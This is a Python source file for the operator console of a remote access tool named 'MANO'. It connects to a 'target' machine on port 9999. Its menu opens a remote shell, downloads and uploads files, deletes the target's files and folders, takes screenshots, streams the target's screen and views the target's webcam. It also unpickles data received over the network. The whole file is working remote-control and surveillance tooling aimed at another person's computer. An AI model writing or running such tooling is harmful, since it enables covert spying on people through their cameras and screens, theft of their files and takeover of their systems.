#copyright © 2019-2024 manoharkakumani
import socket
import sys
import os
import time
import datetime
import shutil
import cv2
import pickle
import struct


# display banner
def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("*******************************************************")
    print("""
 __  __    _    _   _  ___   __   
|  \/  |  / \  | \ | |/ _ \  \ \  
| |\/| | / _ \ |  \| | | | |  \ \ 
| |  | |/ ___ \| |\  | |_| |  / / 
|_|  |_/_/   \_\_| \_|\___/  /_/
copyright © 2019-2024 manoharkakumani""")
    print("\n******************************************************")


#loading animation
def loading_animation():
    a=100
    while int(a)>=0:
        sys.stdout.write("\r|"+"█"*int(a/2)+"|{0:.2f}".format(a)+ "%  ")
        sys.stdout.flush()
        time.sleep(0.01)
        a-=1

class Deleter:
    def __init__(self,context):
        self.context=context

    #delete menu
    def delete_menu(self):
        print(f"""----------------------------------------------------------------------------
1. Delete file 
2. Delet Dir/Folder 
3. Change {self.context.host if self.context else 'your' } directory
4. File list
5. Back 
----------------------------------------------------------------------------""")

    def handle_deleter(self):
        while True:
            self.delete_menu()
            option = input("Enter your choice : ").strip()
            if option == '1':
                file_name=input("Enter file name to delete : ").strip()
                print(self.delete_file(file_name))
            elif option == '2':
                folder_name=input("Enter folder name to delete : ").strip()
                print(self.delete_folder(folder_name))
            elif option == '3':
                print(self.change_directory())
            elif option == '4':
                print(self.list_files())
            elif option == '5':
                return
            else:
                print("Invalid option")

    #delete file
    def delete_file(self,file_name):
        if isinstance(self.context,Client):
            self.context.sock.send(('fdel~'+file_name).encode("utf-8"))
            loading_animation()
            return self.context.sock.recv(1024).decode("utf-8")
        else:
            try:
                if os.path.isfile(file_name):
                    os.unlink(file_name)
                    return "SUCCESS!"
            except Exception as e:
                return e
            
    def delete_folder(self,folder_name):
        if isinstance(self.context,Client):
            self.context.sock.send(('fdel~'+folder_name).encode("utf-8"))
            loading_animation()
            return self.context.sock.recv(1024).decode("utf-8")
        else:
            try:
                if os.path.isdir(folder_name):
                    shutil.rmtree(folder_name)
                    return "SUCCESS!"
            except Exception as e:
                return e
            
    def change_directory(self):
        if isinstance(self.context,Client):
            self.context.sock.send(('cdir~s').encode("utf-8"))
            print("client current working dir : "+self.context.sock.recv(1024).decode("utf-8"))
            if input("Do you want to change (Y/N) ? : ").upper().strip() == 'Y':
                self.context.conn.send(('Y').encode("utf-8"))
                dire=input("Enter path to change: ").strip()
                self.context.conn.send((dire).encode("utf-8"))
                return self.context.sock.recv(1024).decode("utf-8")
            else:
                return
        else:
            try:
                print("Your current working directory : "+os.getcwd())
                if input("Do you want to change (Y/N) ? : ").upper().strip() == 'Y':
                    dire=input("Enter path to change: ").strip()
                    os.chdir(dire)
                    return os.getcwd()
                else:
                    return
            except Exception as e:
                return e
            
    def list_files(self):
        if isinstance(self.context,Client):
            self.context.sock.send(('flist~s').encode("utf-8"))
            return pickle.loads(self.context.sock.recv(1024))
        else:
            return os.listdir()
    
class Client:

    def __init__(self):
        try:
            port = 9999
            self.sock = socket.socket()
            self.host= input('Enter Target IP or q or Q to exit : ').strip()
            if self.host=='q' or self.host=='Q':
                exit(0)
            self.sock.connect((self.host, port))
            self.deleter=Deleter(self)
        except socket.error as msg:
            print("Socket creation error: " + str(msg))

    def __str__(self):
        return f"{self.sock} {self.host}"
    
    #upload file to client
    def send_file(self,filename):
        if os.path.isfile(filename):
            self.sock.send(str("fdown~"+filename).encode("utf-8"))
            self.sock.send(str.encode("EXISTS " + str(os.path.getsize(filename))))
            filesize=int(os.path.getsize(filename))
            userResponse = self.sock.recv(1024).decode("utf-8")
            if userResponse[:2] == 'OK':
                with open(filename, 'rb') as f:
                    bytesToSend = f.read(1024)
                    self.sock.send(bytesToSend)
                    totalSend=len(bytesToSend)
                    while int (totalSend) < int(filesize):
                        bytesToSend = f.read(1024)
                        totalSend += len(bytesToSend)
                        self.sock.send(bytesToSend)
                        sys.stdout.write("\r|"+"█"*int((totalSend/float(filesize))*50)+"|{0:.2f}".format((totalSend/float(filesize))*100)+ "%  ")
                        sys.stdout.flush()
                    print("\nUpload Completed!")
        else:
            print("File Does Not Exist!")

    #download file from client
    def receive_file(self,filename):
        self.sock.send(("fup~"+filename).encode("utf-8"))
        data = self.sock.recv(1024).decode("utf-8")
        if data[:6] == 'EXISTS':
            filesize = data[6:]
            msg = input("File exists, " + str(filesize) +"Bytes, download? (Y/N)? -> ").upper().strip()
            if msg == 'Y':
                self.sock.send("OK".encode("utf-8"))
                f = open(filename, 'wb')
                data = (self.sock.recv(1024))
                totalRecv = len(data)
                f.write(data)
                while int(totalRecv) < int(filesize):
                    data = self.sock.recv(1024)
                    totalRecv += len(data)
                    f.write(data)
                    sys.stdout.write("\r|"+"█"*int((totalRecv/float(filesize))*50)+"|{0:.2f}".format((totalRecv/float(filesize))*100)+ "%  ")
                    sys.stdout.flush()
                    time.sleep(0.01)
                print("\nDownload Complete!")
                f.close()
        else:
            print("File Does Not Exist!")

    #take screenshot of client screen
    def take_screenshot(self):
        self.sock.send(('sshot~s').encode("utf-8"))
        msg=self.sock.recv(1024).decode("utf-8")
        if msg=='OK':
            filename= 'screenshot_'+str(datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))+'.jpg'
            data = self.sock.recv(1024).decode("utf-8")
            if data[:6] == 'EXISTS':
                filesize = data[6:]
                self.sock.send("OK".encode("utf-8"))
                f = open(filename, 'wb')
                data = (self.sock.recv(1024))
                totalRecv = len(data)
                f.write(data)
                while int(totalRecv) < int(filesize):
                    data = self.sock.recv(1024)
                    totalRecv += len(data)
                    f.write(data)
                f.close()
                print("Screenshot saved as "+filename)
            else:
                print("Fail to take screenshot!")
        else:
            print(msg)

    #access client camera
    def access_camera(self):
        self.sock.send(('cam~s').encode("utf-8"))
        K=self.sock.recv(1024).decode("utf-8")
        if K=="OK":
            C=self.sock.recv(1024).decode("utf-8")
            if C=="cam":
                data = b""
                img = struct.calcsize(">L")
                while True:
                    if (cv2.waitKey(1) == 27) or (cv2.waitKey(1) & 0xFF == ord('q')) or (cv2.waitKey(1) & 0xFF == ord('q')):
                        self.sock.send("close".encode('utf-8'))
                        cv2.destroyAllWindows()
                        break
                    else:
                        self.sock.send("cam".encode('utf-8'))
                        while len(data) < img:
                            data += self.sock.recv(4096)
                        img_size = data[:img]
                        data = data[img:]
                        msg_size = struct.unpack(">L", img_size)[0]
                        while len(data) < msg_size:
                            data += self.sock.recv(4096)
                        frame_data = data[:msg_size]
                        data = data[msg_size:]
                        frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
                        frame = cv2.imdecode(frame,cv2.IMREAD_COLOR)
                        cv2.namedWindow('Client Camera', cv2.WINDOW_NORMAL)
                        cv2.imshow('Client Camera',frame)
        else:
            print(K)

    #stream client screen
    def stream_screen(self):
        self.sock.send(('stream~s').encode("utf-8"))
        K=self.sock.recv(1024).decode("utf-8")
        if K=="OK":
            while True:
                if (cv2.waitKey(1) == 27) or (cv2.waitKey(1) & 0xFF == ord('q')) or (cv2.waitKey(1) & 0xFF == ord('q')):
                    self.sock.send("close".encode('utf-8'))
                    cv2.destroyAllWindows()
                    break
                else:
                    data = b""
                    screen = struct.calcsize(">L")
                    self.sock.send("sst".encode('utf-8'))
                    while len(data) < screen:
                        data += self.sock.recv(4096)
                    screen_size = data[:screen]
                    data = data[screen:]
                    msg_size = struct.unpack(">L", screen_size)[0]
                    while len(data) < msg_size:
                        data += self.sock.recv(4096)
                    frame_data = data[:msg_size]
                    data = data[msg_size:]
                    frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
                    frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
                    b,g,r = cv2.split(frame)       # get b,g,r
                    rgb_img = cv2.merge([r,g,b])     # switch it to rgb
                    cv2.namedWindow('Client Screen', cv2.WINDOW_NORMAL)
                    cv2.imshow('Client Screen',rgb_img)
                    cv2.waitKey(1)
        else:
            print(K)

    #send command to client
    def send_command(self,cmd):
        self.sock.send(("cmd~"+cmd).encode("utf-8"))
        client_response = str(self.sock.recv(20480), "utf-8")
        print(client_response, end="")
        while True:
            try:
                cmd = input('').strip()
                if cmd== 'quit':
                    return
                cmd='cmd~'+cmd
                if len(str.encode(cmd)) > 0:
                    self.sock.send(str.encode(cmd))
                    client_response = str(self.sock.recv(20480), "utf-8")
                    print(client_response, end="")
            except:
                print("Error sending commands")
                break

    #close sockection
    def close(self):
        self.sock.send(('exit~s').encode("utf-8"))
        return
    
    def help(self):
        print(f"""
shell   --> To open cmd or terminal
fdown   --> To download files from target
fup     --> Upload files to client
fl      --> List of files in your current directory
cfl     --> List of files in target's current directory
fdel    --> Delete file in your current directory
cdel    --> Delete file from target's current directory
pwd     --> Get your current directory
cwd     --> Get target's current directory
cd      --> Change your current directory
ccd     --> Change target's current directory
sshot   --> To take screenshot of target's screen
cam     --> To access target camera
stream  --> To stream target screen
help    --> Help 
close    --> To terminate : {self.host}""")
        
        #commands that perform on client
    def menu(self):
        deleter = Deleter(None)
        while True:
            cli= input("MANO >>"+self.host+" >> ").strip()
            if cli=='':
                continue
            elif cli=='shell':
                self.send_command('echo')
            elif cli=='fdown':
                filename=input("Enter file name to download : ").strip()
                self.receive_file(filename)
            elif cli=='fup':
                filename=input("Enter file name to upload : ").strip()
                print(self.send_file(filename))
            elif cli=='fl':
                print(deleter.list_files())
            elif cli=='cfl':
                print(self.deleter.list_files())
            elif cli=='cd':
                print(deleter.change_directory())            
            elif cli=='ccd':
                print(self.deleter.change_directory())            
            elif cli=='cdel':
                self.handle_deleter()
            elif cli=='fdel':
                deleter.handle_deleter()
            elif cli=='pwd':
                print("Your current working directory : "+os.getcwd())
            elif cli=='cwd':
                self.sock.send(('cwd~s').encode("utf-8"))
                print("Client current working directory : "+self.sock.recv(1024).decode("utf-8"))
            elif cli=='sshot':
                self.take_screenshot()
            elif cli=='cam':
                self.access_camera()
            elif cli=='stream':
                self.stream_screen()
            elif cli=='close':
                self.close()
                return 
            elif cli == 'help':
                self.help()
            else :
                print("Command not recognized")

if __name__ == '__main__':
    banner()
    while True:
        try:
            client=Client()
            client.menu()
        except Exception as e:
            print(f"Error : {e}")
            time.sleep(5)
            